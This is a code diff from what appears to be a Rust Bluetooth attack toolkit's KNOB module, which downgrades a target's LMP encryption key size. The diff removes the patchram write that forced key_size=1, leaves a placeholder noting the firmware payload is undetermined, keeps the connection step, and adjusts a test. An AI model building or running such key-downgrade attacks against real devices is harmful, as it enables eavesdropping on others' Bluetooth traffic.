@@ -150,28 +150,16 @@ pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
         }
     };
 
-    // Step 2: Write patchram at the handler address to force key_size=1.
-    // Write_RAM (0xFC4C) format: [addr_le32][data...]
-    let mut ram_params = Vec::with_capacity(8);
-    ram_params.extend_from_slice(&handler_addr.to_le_bytes());
-    ram_params.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]); // key_size = 1
+    // Step 2: Log the discovered address. The actual patch payload (ARM Thumb
+    // instructions to force key_size=1) must be determined through firmware RE.
+    // Writing arbitrary bytes to the handler address would corrupt firmware code.
+    log::info!(
+        "knob: LMP key-size handler at 0x{:08X} — patch payload TBD (needs firmware RE)",
+        handler_addr
+    );
 
-    let patch_cmd = HciCommand::vendor(WRITE_RAM, ram_params);
-    if let Err(e) = hci.send_command(&patch_cmd) {
-        log::info!("knob: patchram write failed: {}", e);
-        return BtAttackResult {
-            attack_type: BtAttackType::Knob,
-            target_address: target_addr.to_string(),
-            target_name: None,
-            success: false,
-            capture: None,
-            error: Some(format!("patchram write failed: {}", e)),
-            timestamp: start,
-        };
-    }
-    log::info!("knob: patchram written at 0x{:08X}", handler_addr);
-
-    // Step 3: Initiate BR/EDR connection.
+    // Step 3: Initiate BR/EDR connection (even without the patch, the connection
+    // attempt produces useful diagnostic data for capture).
     // HCI_Create_Connection parameters:
     //   BD_ADDR(6) + packet_type(2) + page_scan_rep_mode(1) + reserved(1) +
     //   clock_offset(2) + allow_role_switch(1)
@@ -250,6 +238,8 @@ mod tests {
     #[test]
     #[cfg(not(target_os = "linux"))]
     fn test_discover_lmp_key_size_addr_stub() {
+        // Reset cache to avoid test ordering issues.
+        LMP_KEY_SIZE_ADDR.store(0, Ordering::Relaxed);
         let hci = HciSocket::open(0).unwrap();
         // Stub returns 8 zero bytes — too short for 64-entry table.
         let addr = discover_lmp_key_size_addr(&hci);
